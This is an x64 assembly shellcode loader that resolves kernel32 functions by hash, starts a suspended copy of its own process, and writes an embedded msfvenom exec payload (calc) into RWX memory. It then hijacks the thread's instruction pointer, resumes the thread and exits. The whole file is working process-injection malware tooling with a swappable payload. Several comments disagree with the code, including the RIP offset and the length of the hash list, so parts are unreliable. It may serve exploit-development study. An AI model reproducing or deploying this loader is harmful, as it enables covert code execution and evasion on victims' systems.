[SECTION .text]

BITS 64

_start:
    jmp main
    
    ; Constants
    win32_library_hashes:
        call win32_library_hashes_return
        ; LoadLibraryA      R13
        dd 0xEC0E4E8E
        ; CreateProcessW - R13 + 0x08
		dd 0x16B3FE88
		; TerminateProcess - R13 + 0x10
		dd 0x78B5B983
		; GetThreadContext - R13 + 0x18
		dd 0x68A7C7D2
		; VirtualAllocEx - R13 + 0x20
		dd 0x6E1A959C
		; WriteProcessMemory - R13 + 0x28
		dd 0xD83D6AA1
		; SetThreadContext - R13 + 0x30
		dd 0xE8A7C7D3
		; ResumeThread - R13 + 0x38
		dd 0x9E4A3F88
        ; GetCurrentProcess - R13 + 40
        dd 0x7B8F17E6
    
    ; ======== Function: find_kernel32
    find_kernel32:
        push rsi
        mov rax, [gs:0x60]
        mov rax, [rax+0x18]
        mov rax, [rax+0x20]
        mov rax, [rax]
        mov rax, [rax]
        mov r11, [rax+0x20]             ; Kernel32 Base Stored in R11
        pop rsi
        ret
        
    ; ======= Function: find_function
    find_function:
        mov eax, [r11+0x3C]
        mov edx, [r11+rax+0x88]
        add rdx, r11                        ; RDX now points to the IMAGE_DATA_DIRECTORY structure
        mov ecx, [rdx+0x18]                 ; ECX = Number of named exported functions
        mov ebx, [rdx+0x20]
        add rbx, r11                        ; RBX = List of exported named functions
    find_function_loop:
        jecxz find_function_finished
        dec ecx                             ; Going backwards
        lea rsi, [rbx+rcx*4]                ; Point RSI at offset value of the next function name
        mov esi, [rsi]                      ; Put the offset value into ESI
        add rsi, r11                        ; RSI now points to the exported function name
        
    compute_hash:
        xor edi, edi                        ; Zero EDI
        xor eax, eax                        ; Zero EAX
        cld                                 ; Reset direction flag
    compute_hash_again:
        mov al, [rsi]                       ; Place the first character from the function name into AL
        inc rsi                             ; Point RSI to the next character of the function name
        test al, al                         ; Test to see if the NULL terminator has been reached
        jz compute_hash_finished
        ror edi, 0x0D                       ; Rotate the bits of EDI right 13 bits
        add edi, eax                        ; Add EAX to EDI
        jmp compute_hash_again
    compute_hash_finished:
    find_function_compare:
        cmp edi, r12d                       ; Compare the calculated hash to the stored hash
        jnz find_function_loop
        mov ebx, [rdx+0x24]                 ; EBX contains the offset to the AddressNameOrdinals list
        add rbx, r11                        ; RBX points to the AddressNameOrdinals list
        mov cx, [rbx+2*rcx]                 ; CX contains the function number matching the current function 
        mov ebx, [rdx+0x1C]                 ; EBX contains the offset to the AddressOfNames list
        add rbx, r11                        ; RBX points tot he AddressOfNames List
        mov eax, [rbx+4*rcx]                ; EAX contains the offset of the desired function address
        add rax, r11                        ; RAX contains the address of the desired function
    find_function_finished:
        ret
        
    ; ======== Function: resolve_symbols_for_dll
    resolve_symbols_for_dll:
        mov r12d, [r8d]                     ; Move the next function hash into R12
        add r8, 0x04                        ; Point R8 to the next function hash
        call find_function
        mov [r15], rax                      ; Store the resolved function address
        add r15, 0x08                       ; Point to the next free space
        cmp r9, r8                          ; Check to see if the end of the hash list was reached
        jne resolve_symbols_for_dll
    resolve_symbols_for_dll_finished:
        ret
        
    ; ======== Inject Code
    ; Payload
    injected_code:
    call injected_code_return
    ; msfvenom -p windows/x64/exec -a x64 --platform windows CMD=calc -f dword EXITFUNC=thread
    ; No encoder specified, outputting raw payload
    ; Payload size: 272 bytes
    ; Final size of dword file: 832 bytes
    dd 0xe48348fc
    dd 0x00c0e8f0
    dd 0x51410000
    dd 0x51525041
    dd 0xd2314856
    dd 0x528b4865
    dd 0x528b4860
    dd 0x528b4818
    dd 0x728b4820
    dd 0xb70f4850
    dd 0x314d4a4a
    dd 0xc03148c9
    dd 0x7c613cac
    dd 0x41202c02
    dd 0x410dc9c1
    dd 0xede2c101
    dd 0x48514152
    dd 0x8b20528b
    dd 0x01483c42
    dd 0x88808bd0
    dd 0x48000000
    dd 0x6774c085
    dd 0x50d00148
    dd 0x4418488b
    dd 0x4920408b
    dd 0x56e3d001
    dd 0x41c9ff48
    dd 0x4888348b
    dd 0x314dd601
    dd 0xc03148c9
    dd 0xc9c141ac
    dd 0xc101410d
    dd 0xf175e038
    dd 0x244c034c
    dd 0xd1394508
    dd 0x4458d875
    dd 0x4924408b
    dd 0x4166d001
    dd 0x44480c8b
    dd 0x491c408b
    dd 0x8b41d001
    dd 0x01488804
    dd 0x415841d0
    dd 0x5a595e58
    dd 0x59415841
    dd 0x83485a41
    dd 0x524120ec
    dd 0x4158e0ff
    dd 0x8b485a59
    dd 0xff57e912
    dd 0x485dffff
    dd 0x000001ba
    dd 0x00000000
    dd 0x8d8d4800
    dd 0x00000101
    dd 0x8b31ba41
    dd 0xd5ff876f
    dd 0x2a1de0bb
    dd 0xa6ba410a
    dd 0xff9dbd95
    dd 0xc48348d5
    dd 0x7c063c28
    dd 0xe0fb800a
    dd 0x47bb0575
    dd 0x6a6f7213
    dd 0x89415900
    dd 0x63d5ffda
    dd 0x00636c61

        
    create_empty_structure:
		pop rbx
		xor rax, rax                        ; Zero RAX
		sub rsp, rcx                        ; Allocate stack space for the two structures
		mov rdi, rsp                        ; set rdi to point to the STARTUPINFO structure
		push rdi                            ; Preserve RDI on the stack as it will be modified by the following instructions
		rep stosb                           ; Repeat storing zero at the buffer starting at rdi until rcx is zero
		pop rdi                             ; restore RDI to its original value
		push rbx
		ret

    perform_injection:
        ; Get current process ImagePathName
        mov rax, [gs:0x60]                  ; Store the address of the PEB structure in RAX 
        mov rax, [rax+0x20]                 ; Store the address of the _RTL_USER_PROCESS_PARAMETERS  
                                            ; structure in RAX 
        mov rax, [rax+0x68]                 ; Store the address of the ImageProcessName value in RAX 
        mov [r13+0x48], rax                 ; Store the address of the process path at R13+0x48 to use later 
        
        ; Create & Initialize structures
        xor rcx, rcx
        mov cl, 0x80
        call create_empty_structure
        
        mov byte[rdi], 0x68                 ; Set STARTUPINFOW.cb = 0x68
        
        ; Create a suspended process
        xor rcx, rcx                        ; prep the stack for x64 fastcall
        mov cl, 0x48                        ; 0x20 shadow space + 6 arguments
        call create_empty_structure
        
        lea rsi, [rdi+0x68]                 ; Load the effective address of the PROCESS_INFORMATION structure into RSI
        mov [rsp+0x48], rsi                 ; Push the pointer to the lpProcessInformation structure
        mov [rsp+0x40], rdi                 ; Push the pointer to the lpStartupInfo structure
        mov [rsp+0x38], rax                 ; lpCurrentDirectory = NULL
        mov [rsp+0x30], rax                 ; lpEnvironment = NULL
        mov byte [rsp+0x28], 0x04                ; dwCreationFlags = CREATE_SUSPENDED
        mov [rsp+0x20], rax                 ; bInheritHandles = FALSE
        mov r9, rax                         ; lpThreadAttributes = NULL
        mov r8, rax                         ; lpProcessAttributes = NULL
        mov rdx, qword [r13+0x48]           ; lpCommandLine = current process
        mov rcx, rax                        ; lpApplicationName = NULL
        call [r13+0x08]                     ; Call CreateProcessW
        add rsp, 0x48                       ; Clean up the stack 0x20 + 0x28 = fastcall + 6 arguments
        
        
        ; Begin GetThreadContext
        xor rcx, rcx                        ; Create CONTEXT object
        mov ecx, 0x04F8                     ; CONTEXT + 0x08 for padding for stack adjustment
        call create_empty_structure

        ; Save CONTEXT object & 16-bit align it
        mov r15, rsp
        push 0
        and r15, -16                        ; CONTEXT object should be 16-bit aligned
        mov dword [r15+0x30], 0x010007      ; CONTEXT ContextFlags = CONTEXT_FULL
        
        xor rcx, rcx                        ; prep the stack for x64 fastcall
        mov cl, 0x20                        ; 0x20 shadow space
        call create_empty_structure
        
        mov rdx, r15                        ; lpContext
        mov rcx, qword [rsi+0x08]           ; hThread = PROCESS_INFORMATION.hThread = R13+0x04
        call [r13+0x18]                     ; Call GetThreadContext
        add rsp, 0x20                       ; Clean up stack

        ; Begin VirtualAllocEx
        xor rcx, rcx                        ; prep the stack for x64 fastcall
        mov cl, 0x28                        ; 0x20 shadow space + 1 argument
        call create_empty_structure
        
        mov dword [rsp+0x20], 0x40          ; flProtect = PAGE_EXECUTE_READWRITE
        mov r9, 0x1000                      ; flAllocationType = MEM_COMMIT
        mov r8, 0x5000                      ; dwSize = 20kb
        mov rdx, 0                          ; lpAddress = NULL
        mov rcx, qword [rsi]                ; hProcess = PROCESS_INFORMATION.hProcess = RSI
        call [r13+0x20]                     ; Call VirtualAllocEx
        add rsp, 0x28

        ; Setup CONTEXT object for thread change
        mov [r15+0xf8], rax                 ; CONTEXT object offset 0xB8 = RIP
        
        ; Begin WriteProcessMemory
        xor rcx, rcx                        ; prep the stack for x64 fastcall
        mov cl, 0x28                        ; 0x20 shadow space + 1 argument
        call create_empty_structure
        
        mov dword [rsp+0x20],  0            ; lpNumberOfBytesWritten = NULL
        mov r9, 0x110                       ; nSize = 0x110 = 272 bytes 
        jmp injected_code                   ; jump to the stored code 
        injected_code_return:               ; lpBuffer = return address pushed to the stack
        pop r8                              ; pop the return address into R8
        mov rdx, [r15+0xf8]                 ; lpBaseAddress
        mov ecx, dword [rsi]                ; hProcess = PROCESS_INFORMATION.hProcess = RSI
        call [r13+0x28]                     ; Call WriteProcessMemory
        add rsp, 0x28

        ; Begin SetThreadContext
        xor rcx, rcx                        ; prep the stack for x64 fastcall
        mov cl, 0x20                        ; 0x20 shadow space
        call create_empty_structure
        
        mov rdx, r15                        ; lpContext = CONTEXT structure
        mov rcx, qword [rsi+0x08]           ; hThread = PROCESS_INFORMATION.hThread = RSI+0x04
        call [r13+0x30]                     ; Call SetThreadContext
        add rsp, 0x20                       ; Clean up the stack

        ; Begin ResumeThread
        xor rcx, rcx                        ; prep the stack for x64 fastcall
        mov cl, 0x20                        ; 0x20 shadow space
        call create_empty_structure
        
        mov rcx, qword [rsi+0x08]           ; hThread = PROCESS_INFORMATION.hThread = RSI+0x04
        call [r13+0x38]                     ; Call ResumeThread
        add rsp, 0x20                       ; Clean up the stack
        
        ; Begin GetCurrentProcess
        xor rcx, rcx                        ; prep the stack for x64 fastcall
        mov cl, 0x20                        ; 0x20 shadow space
        call create_empty_structure
        
        call [r13+0x40]                     ; Call GetCurrentProcess
        add rsp, 0x20                       ; Clean up the stack

        ; Begin TerminateProcess
        mov [r13+0x50], rax                 ; Save the process handle
        xor rcx, rcx                        ; prep the stack for x64 fastcall
        mov cl, 0x20                        ; 0x20 shadow space
        call create_empty_structure
        
        xor rdx, rdx                        ; Exit Code 0
        mov rcx, [r13+0x50]                 ; pHandle, RAX = Current process handle
        call [r13+0x10]                     ; Call TerminateProcess
        
    main:
        sub rsp, 0x110                      ; Allocate space on stack for function addresses
        mov rbp, rsp                        ; Set ebp as frame ptr for relative offset on stack
        call find_kernel32                  ; Find base address of kernel32.dll
        jmp  win32_library_hashes
        win32_library_hashes_return:
        pop r8                              ; R8 is the hash list location
        mov r9, r8
        add r9, 0x40                        ; R9 marks the end of the hash list
        lea r15, [rbp+0x10]                 ; This will be a working address used to store our function addresses
        mov r13, r15                        ; R13 will be used to reference the stored function addresses
        call resolve_symbols_for_dll
        call perform_injection
